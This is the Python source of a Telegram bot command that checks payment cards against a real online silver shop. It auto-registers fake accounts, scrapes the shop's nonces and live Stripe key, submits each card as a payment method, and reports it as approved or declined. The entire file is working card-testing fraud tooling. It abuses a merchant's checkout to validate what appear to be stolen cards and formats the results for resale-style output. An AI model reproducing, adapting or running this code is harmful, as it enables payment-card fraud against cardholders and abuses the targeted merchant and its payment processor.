# commands/auth1.py
from aiogram import Router, types
from aiogram.filters import Command
import asyncio
import re
import random
import time
from datetime import datetime
from uuid import uuid4
import aiohttp
from aiohttp import ClientSession, ClientTimeout
from string import ascii_lowercase, ascii_letters, digits

router = Router()

# ---------- Helpers ----------
def gen_mail():
    return f"{''.join(random.choices(ascii_lowercase + digits, k=10))}@gmail.com"

def gen_pass(length=12):
    chars = ascii_letters + digits + "!@#$%^&*()"
    return ''.join(random.choices(chars, k=length))

async def get_bin_info(session, bin6):
    try:
        async with session.get(f"https://lookup.binlist.net/{bin6}", timeout=5) as resp:
            if resp.status == 200:
                data = await resp.json()
                bank = data.get('bank', {}).get('name', 'Unknown')
                brand = data.get('brand', 'Unknown')
                ctype = data.get('type', 'Unknown')
                country = data.get('country', {}).get('name', 'Unknown')
                prepaid = data.get('prepaid', False)
                msg = (
                    f"🏦 **BIN:** `{bin6}`\n"
                    f"🏛 **Bank:** {bank}\n"
                    f"💳 **Brand:** {brand}\n"
                    f"🌍 **Country:** {country}\n"
                    f"✅ **Type:** {ctype}\n"
                    f"💳 **Prepaid:** {'YES' if prepaid else 'NO'}\n"
                )
                return msg
    except:
        pass
    return f"🏦 **BIN:** `{bin6}`\n⚠️ BIN lookup failed."

async def process_card(card_str):
    # Parse card
    parts = card_str.split('|')
    if len(parts) != 4:
        return "❌ Invalid format. Use `CC|MM|YY|CVV` (YY can be 2 or 4 digits)"
    cc, mm, yy, cvv = [p.strip() for p in parts]
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy_full = f"20{yy}"
    else:
        yy_full = yy
    if int(yy_full) < datetime.now().year:
        return "❌ Card expired."
    bin6 = cc[:6]
    start_time = time.time()
    async with ClientSession(timeout=ClientTimeout(total=30)) as session:
        # ----- BIN lookup -----
        bin_msg = await get_bin_info(session, bin6)
        # ----- Step 1: Get register nonce -----
        url = "https://copenhagensilver.com/my-account/"
        headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
        }
        async with session.get(url, headers=headers) as resp:
            html = await resp.text()
            match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
            if not match:
                return "❌ Failed to extract register nonce"
            reg_nonce = match.group(1)
        # ----- Register new account -----
        email = gen_mail()
        password = gen_pass()
        data = {
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        headers['content-type'] = 'application/x-www-form-urlencoded'
        async with session.post(url, headers=headers, data=data):
            pass
        # ----- Get add-payment-method page -----
        add_url = "https://copenhagensilver.com/my-account/add-payment-method/"
        headers['referer'] = "https://copenhagensilver.com/my-account/payment-methods/"
        async with session.get(add_url, headers=headers) as resp:
            page_text = await resp.text()
            match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', page_text)
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', page_text)
            if not match or not pk_match:
                return "❌ SetupIntent nonce or Stripe PK not found"
            nonce = match.group(1)
            pk = pk_match.group(0)
        # ----- Create Stripe payment method -----
        guid = str(uuid4())
        muid = str(uuid4())
        sid = str(uuid4())
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': headers['user-agent'],
        }
        stripe_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy_full[2:],
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "billing_details[address][country]": "EG",
            "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
            "referrer": "https://copenhagensilver.com",
            "time_on_page": str(random.randint(10000, 99999)),
            "client_attribution_metadata[client_session_id]": str(uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[elements_session_config_id]": str(uuid4()),
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": pk,
            "_stripe_version": "2024-06-20"
        }
        async with session.post(stripe_url, headers=stripe_headers, data=stripe_data) as resp:
            pm_json = await resp.json()
            token = pm_json.get("id")
            if not token:
                return "❌ Failed to create Stripe payment method"
        # ----- Confirm setup intent -----
        ajax_url = "https://copenhagensilver.com/wp-admin/admin-ajax.php"
        ajax_headers = {
            'authority': 'copenhagensilver.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://copenhagensilver.com',
            'referer': add_url,
            'user-agent': headers['user-agent'],
            'x-requested-with': 'XMLHttpRequest',
        }
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': token,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        async with session.post(ajax_url, headers=ajax_headers, data=ajax_data) as resp:
            try:
                result = await resp.json()
                if result.get('success'):
                    status = "✅ APPROVED"
                else:
                    error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                    status = f"❌ DECLINED – {error_msg}"
            except:
                status = "❌ Unexpected response"
        elapsed = time.time() - start_time
        final_msg = (
            f"{bin_msg}\n\n"
            f"💳 **Card:** `{cc}|{mm}|{yy_full[-2:]}|{cvv}`\n"
            f"📦 **Result:** {status}\n"
            f"⏱️ **Time:** {elapsed:.2f}s\n\n"
            f"By @hqdeven"
        )
        return final_msg

@router.message(Command("auth1"))
async def cmd_auth1(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ **Usage:** `/auth1 CC|MM|YY|CVV`\nExample: `/auth1 4111111111111111|12|28|123`")
        return
    card_input = args[1].strip()
    progress = await message.answer("⏳ **Processing card...**")
    try:
        result = await process_card(card_input)
        await progress.edit_text(result)
    except Exception as e:
        await progress.edit_text(f"❌ **Error:** {str(e)}")
